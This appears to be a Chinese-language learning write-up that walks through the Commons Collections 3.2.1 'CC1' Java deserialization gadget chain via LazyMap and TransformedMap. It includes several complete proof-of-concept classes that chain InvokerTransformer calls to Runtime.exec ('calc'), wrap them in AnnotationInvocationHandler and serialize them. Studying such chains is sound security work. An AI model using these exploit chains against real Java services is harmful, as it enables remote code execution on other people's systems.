# Commons Collections简介

Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。

Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。

## 包结构介绍

- `org.apache.commons.collections` – CommonsCollections自定义的一组公用的接口和工具类
- `org.apache.commons.collections.bag` – 实现Bag接口的一组类
- `org.apache.commons.collections.bidimap` – 实现BidiMap系列接口的一组类
- `org.apache.commons.collections.buffer` – 实现Buffer接口的一组类
- `org.apache.commons.collections.collection` –实现java.util.Collection接口的一组类
- `org.apache.commons.collections.comparators`– 实现java.util.Comparator接口的一组类
- `org.apache.commons.collections.functors` –Commons Collections自定义的一组功能类
- `org.apache.commons.collections.iterators` – 实现java.util.Iterator接口的一组类
- `org.apache.commons.collections.keyvalue` – 实现集合和键/值映射相关的一组类
- `org.apache.commons.collections.list` – 实现java.util.List接口的一组类
- `org.apache.commons.collections.map` – 实现Map系列接口的一组类
- `org.apache.commons.collections.set` – 实现Set系列接口的一组类

# 环境安装

- jdk8u65：https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

  安装后解压src.zip

  ![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231115140857.png)

  实测尽量安装在C盘，否则没有这个压缩包。

- 手动导入sun包：https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4

找到src\share\classes下的sun，复制到jdk目录的src下：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231115141225.png)

这一步的作用是：因为我们打开源码，很多地方的文件是 .class 文件，是已经编译完了的文件，都是反编译代码，我们很难读懂，所以需要把它转换为 .java 文件。解压 jdk8u65 的 src.zip，解压完之后，我们把 openJDK 8u65 解压出来的 sun 文件夹拷贝进 jdk8u65 中，这样子就能把 .class 文件转换为 .java 文件了。

- 新建一个IDEA项目，选择Maven，并使用jdk8u65，添加对CC1链的依赖包：

  ```
  <dependencies>
      <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
      <dependency>
      	<groupId>commons-collections</groupId>
      	<artifactId>commons-collections</artifactId>
     	 	<version>3.2.1</version>
      </dependency>
  </dependencies>
  ```

# Gadget Chain With LazyMap

根据ysoserial给出的gadget chain：

```java
Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
```

可以发现最后的命令执行和Transformer接口有关，ctrl + alt + B，查看实现接口的类：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231115153603.png)

## 1.InvokerTransformer

给出的利用链中出现InvokerTransformer类，所以先看一下InvokerTransformer，搜索getMethod：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231115155553.png)

回顾一下getMethod的使用方法：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231115160202.png)

目标是实例化InvokerTransformer类，iMethodName为exec，iParamTypes为new Class[] {String.class}，iArgs为要执行的命令。然后调用InvokerTransformer的transform方法并使其输入对象为Runtime类。

测试一下：

```java
import org.apache.commons.collections.functors.InvokerTransformer;


public class Test {
    public static void main(String[] args){
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[] {String.class},new Object[] {"calc"});
        invokerTransformer.transform(runtime);
    }
}

```

注意传入参数的类型需要和构造函数一致。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231115164427.png)

那么猜测肯定有地方能实例化InvokerTransformer或者调用其getInstance方法。根据利用链，再往上是ConstantTransformer

## 2.ConstantTransformer

构造函数的时候传入⼀个对象，并在transform方法将这个对象再返回：  

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231116124656.png)

## 3.ChainedTransformer

继续往上看：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231116130322.png)

ChainedTransformer也是实现了Transformer接口的⼀个类，它的作用是将内部的多个Transformer串
在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传入，我们画⼀个图做示意：  

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231116132717.png)

将这几个Transformer整合起来：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class Test {
    public static void main(String[] args){
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec",new Class[] {String.class},new Object[] {"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
    }
}

```

创建了⼀个ChainedTransformer，其中包含两个Transformer：第⼀个是ConstantTransformer，直接返回当前环境的Runtime对象；第⼆个是InvokerTransformer，执⾏Runtime对象的exec⽅法，参
数是calc 。
当然，这个transformerChain只是⼀系列回调，我们需要用其来包装innerMap，使用的下面Gadget Chain With TransformedMap说到的TransformedMap.decorate ：  

```java
Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
```

最后，怎么触发回调呢？就是向Map中放⼊⼀个新的元素：  

```java
outerMap.put("test", "xxxx");
```

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231117140935.png)

## 4.LazyMap

再往上是LazyMap的get方法：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231116134128.png)

LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承AbstractMapDecorator。

LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform 。其实这也好理解，LazyMap的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值。

但是相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些，原因是在
sun.reflect.annotation.AnnotationInvocationHandler 的readObject方法中并没有直接调用到
Map的get方法。

## 5.AnnotationInvocationHandler

所以ysoserial找到了另一条路，AnnotationInvocationHandler类的invoke方法有调用到get：  

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231119144705.png)

那么又如何能调用到 AnnotationInvocationHandler#invoke 呢？ysoserial的作者想到的是利用Java的对象代理。  

### Java对象代理

作为一门静态语言，如果想劫持一个对象内部的方法调用，实现类似PHP的魔术方法 __call ，我们需
要用到 java.reflect.Proxy ：

```java
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new
Class[] {Map.class}, handler);
```

Proxy.newProxyInstance 的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要
代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻
辑。

比如，我们写这样一个类ProxyTest：

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;

public class ProxyTest implements InvocationHandler {
    protected Map map;
    public ProxyTest(Map map) {
        this.map = map;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().compareTo("get") == 0) {
            System.out.println("Hook method: " + method.getName());
            return "Hacked Object";
        }
        return method.invoke(this.map, args);
    }
}
```

该类实现了invoke方法，作用是在监控到调用的方法名是get的时候，返回一个特殊字符串 Hacked Object 。

在外部调用这个ProxyTest：  

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class ProxyTestApp {
    public static void main(String[] args) throws Exception {
        InvocationHandler handler = new ProxyTest(new HashMap());
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        proxyMap.put("hello", "world");
        String result = (String) proxyMap.get("hello");
        System.out.println(result);
    }
}
```

运行ProxyTestApp，我们可以发现，虽然我向Map放入的hello值为world，但我们获取到的结果却是 Hacked Object ：  

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231117134306.png)

我们回看 sun.reflect.annotation.AnnotationInvocationHandler，会发现实际上这个类实际就
是一个InvocationHandler，我们如果将这个对象用Proxy进行代理，那么在readObject的时候，只要
调用任意方法，就会进入到 AnnotationInvocationHandler#invoke 方法中，进而触发我们的
LazyMap#get。

## 构造利用链

在TransformedMap POC的基础上进行修改，首先使用LazyMap替换TransformedMap：  

```java
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```

然后，我们需要对 sun.reflect.annotation.AnnotationInvocationHandler 对象进行Proxy：  

```java
Class clazz =
Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new
Class[] {Map.class}, handler);
```

代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是
sun.reflect.annotation.AnnotationInvocationHandler#readObject ，所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹：  

```java
handler = (InvocationHandler) construct.newInstance(Retention.class,
proxyMap);
```

POC：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class), 
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] { "calc.exe" }),
};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
        
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();
        
        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

# Gadget Chain With TransformedMap

三个Transformer的实现类和上面一样，就跳过了。

## TransformedMap

TransformedMap用于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可
以执行⼀个回调。我们通过下⾯这行代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：  

```java
Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,
valueTransformer);
```

其中， keyTransformer是处理新元素的Key的回调， valueTransformer是处理新元素的value的回调。
我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，而是⼀个实现了Transformer接口的类。  

先贴一个这一步的最终demo，原理后面再说：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args){
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec",new Class[] {String.class},new Object[] {"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

看到这其实可能还不明白，这最后三行到底是怎么调用的ChainedTransformer的transform方法？

首先，TransformedMap类只有一处调用了transform方法：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231117144621.png)

这个valueTransformer在构造函数中被定义：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231117144712.png)

而构造函数的作用域是protected，无法直接获取。但是却有一个静态方法decorate，decorate在实例化TransformedMap的同时会调用构造方法，这就给了我们机会。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231117145610.png)

然后利用反射获取checkSetValue方法;

```java
Class<TransformedMap> transformedMapClass = TransformedMap.class;  
Method checkSetValueMethod = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);   checkSetValueMethod.setAccessible(true);  
checkSetValueMethod.invoke(decorateMap, runtime);  
```

总体如下：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec",new Class[] {String.class},new Object[] {"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = TransformedMap.decorate(hashMap, null, transformerChain);
        Class<TransformedMap> transformedMapClass = TransformedMap.class;
        Method checkSetValueMethod = transformedMapClass.getDeclaredMethod("checkSetValue", Object.class);
        checkSetValueMethod.setAccessible(true);
        checkSetValueMethod.invoke(decorateMap,transformerChain);
    }
}
```

这是一个成功的demo，但是却无法再进一步了。我们需要另找其他的方法。

TransformedMap父类AbstractInputCheckedMapDecorator的内部的MapEntry类也调用了checkSetValue

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231117154557.png)

这里的entry是Map.entry。

Map是java中的接口，Map.Entry是Map的一个内部接口。

Map提供了一些常用方法，如`keySet()`、`entrySet()`等方法。

`keySet()`方法返回值是Map中key值的集合；`entrySet()`的返回值也是返回一个Set集合，此集合的类型为Map.Entry

Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为Entry。它表示Map中的一个实体（一个key-value对）。接口中有`getKey`、`getValue`、`setValue`等方法。

由于Map中存放的元素均为键值对，故每一个键值对必然存在一个映射关系。 Map中采用Entry内部类来表示一个映射项，映射项包含Key和Value (我们总说键值对键值对, 每一个键值对也就是一个Entry) Map.Entry里面包含`getKey()`和`getValue()`方法

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231117164724.png)

```java
import java.util.HashMap;
import java.util.Map;

public class TestTest {
    public static void main(String[] args) {
        HashMap<String,String>  hashmap = new HashMap();
        hashmap.put("apple","banana");
        //如何遍历一个Map
        for (Map.Entry entry : hashmap.entrySet()) {
            System.out.println("key= " + entry.getKey() + " and value= " + entry.getValue());
        }
//可以看到这里的entry就代表一个键值对，通过getKey()和getValue()方法得到键值
    }
}
//输出：key= apple and value= banana
```

现在就可以理解，这里的`setValue()`，实际上相当于其父类的的`setValue()`的重写。因为TransformedMap最终是继承于Map的。

我们需要找到是数组的入口类，遍历这个数组，并调用`setValue()`。

## AnnotationInvocationHandler

## 

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231117173640.png)

这里全局寻找setValue我怎么也没法直接find usages找到AnnotationInvocationHandler，只能手动选择jdk目录才行。想不明白怎么回事。

可以看到setValue方法正好在readObject里，完美满足需求。

```java
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```

核心逻辑就是 `Map.Entry<String, Object> memberValue : memberValues.entrySet()` 和 `memberValue.setValue(...)` 。

`memberValues` 就是反序列化后得到的Map，也是经过了`TransformedMap`修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用 `setValue` 设置值的时候就会触发 TransformedMap 里注册的 `Transform`，进而执行我们为其精心设计的任意代码。

所以，我们构造POC的时候，就需要创建一个AnnotationInvocationHandler对象，并将前面构造的
HashMap设置进来： 

```java
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
Object obj = construct.newInstance(Retention.class, outerMap);
```

这里因为 sun.reflect.annotation.AnnotationInvocationHandler 是在JDK内部的类，不能直接使
用new来实例化。使用反射获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化
了。

AnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是
参数就是前面构造的Map。  

## 构造利用链

AnnotationInvocationHandler就是利用链的起点了，我们用如下代码将这个对象生成序列化流：

```java
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(obj);
oos.close();
```

将这段代码贴在demo的后面，尝试运行：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec",new Class[] {String.class},new Object[] {"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("test","xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class,outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();
    }
}
```

出现异常：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231119133547.png)

原因是，Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实
现了 java.io.Serializable 接口。而我们最早传给ConstantTransformer的是Runtime.getRuntime() ，Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化 。

通过反射获取Runtime对象：

```java
Method method = Runtime.class.getMethod("getRuntime");
Runtime r= (Runtime) method.invoke(null);
r.exec("calc");
```

修改POC：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec",new Class[] {String.class},new String[] {"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("test","xxxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class,outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois =new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}

```

看着挺复杂，其实只要看我之前发的反射基础篇就能很轻松写出来。

其实和demo最大的区别就是将 Runtime.getRuntime() 换成了 Runtime.class ，前者是一个
java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所
以可以被序列化。  

但是报错解决了，却没有成功执行calc：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231119141530.png)

原因在于AnnotationInvocationHandler，readObject里有一个对var7的判断，只有它不是null才会继续执行setValue。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231119141827.png)

找到有关var7的语句：

```
var2 = AnnotationType.getInstance(this.type);
Map var3 = var2.memberTypes();
Iterator var4 = this.memberValues.entrySet().iterator();
......
Entry var5 = (Entry)var4.next();
String var6 = (String)var5.getKey();
Class var7 = (Class)var3.get(var6);
```

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231119142537.png)

可以看到var3里面有个key值是value，var6则是我们手动添加进hashmap的key值test，不匹配所以返回null，那么我们只要把test改为value即可：

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231119142803.png)

最终POC：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[] {String.class,Class[].class},new Object[] {"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",new Class[] {Object.class,Object[].class},new Object[] {null, new Object[0]}),
                new InvokerTransformer("exec",new Class[] {String.class},new String[] {"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value","Troy3e");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);


        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class,outerMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(obj);
        oos.close();
    }
}

```

还有一个问题，就是为什么在利用AnnotationInvocationHandler构造方法创建新对象的时候，第一个参数是Retention.class？

sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法。

![](https://picgo-1300397932.cos.ap-nanjing.myqcloud.com/picgo/20231119143654.png)

# LazyMap与TransformedMap的对比  



# 总结

写的有点乱，应该先研究TransformedMap这条链的。

初学者看这个还是有些吃力，继续学习。

# 参考链接

- https://wx.zsxq.com/dweb2/index/group/2212251881
- https://www.freebuf.com/articles/web/335892.html
- https://github.com/Y4tacker/JavaSec/blob/main/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/CommonsCollections1/CommonsCollections1.md
- https://johnfrod.top/%E5%AE%89%E5%85%A8/commonscollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/

